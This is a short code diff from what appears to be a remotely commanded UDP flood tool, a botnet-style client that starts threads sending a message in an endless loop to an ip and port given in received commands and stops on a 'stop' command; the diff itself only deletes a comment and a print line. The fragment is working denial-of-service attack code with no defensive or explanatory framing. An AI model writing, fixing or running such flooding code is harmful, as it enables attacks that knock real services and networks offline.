@@ -23,8 +23,6 @@ def udp(ip, port, message):
     while attack == True:
         sock.sendto(message.encode("utf-8"), (ip, port))
 
-######################## FIX ATTACK IN __main___
-
 # runs in the beginning of the program
 if __name__ == "__main__":
     sock = create()
@@ -43,7 +41,6 @@ if __name__ == "__main__":
                     threading.Thread(target=udp, args=(command[1], command[2], command[3])).start()
                 elif command[0] == "stop":
                     attack = False
-                    print("stoped")
             except:
                 pass
         except:
